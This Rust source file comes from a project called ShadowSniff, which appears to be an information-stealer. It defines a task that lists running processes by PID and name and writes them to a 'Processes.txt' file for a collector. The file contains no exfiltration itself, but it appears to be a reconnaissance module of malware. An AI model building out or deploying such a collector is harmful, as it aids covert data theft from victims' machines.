/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use alloc::string::{String, ToString};
use collector::Collector;
use core::fmt::Write;
use filesystem::path::Path;
use filesystem::{FileSystem, WriteTo};
use tasks::{Task, parent_name};
use utils::process::get_process_list;

pub(super) struct ProcessesTask;

impl<C: Collector, F: FileSystem> Task<C, F> for ProcessesTask {
    parent_name!("Processes.txt");

    fn run(&self, parent: &Path, filesystem: &F, _: &C) {
        let processes = get_process_list();

        let max_pid_width = processes
            .iter()
            .map(|p| p.pid.to_string().len())
            .max()
            .unwrap_or(3);

        let pid_col_width = max_pid_width + 2;

        let mut output = String::new();
        let _ = writeln!(&mut output, "{:<width$}NAME", "PID", width = pid_col_width);

        for process in processes {
            let _ = writeln!(
                &mut output,
                "{:<width$}{}",
                process.pid,
                process.name,
                width = pid_col_width
            );
        }

        let _ = output.write_to(filesystem, parent);
    }
}
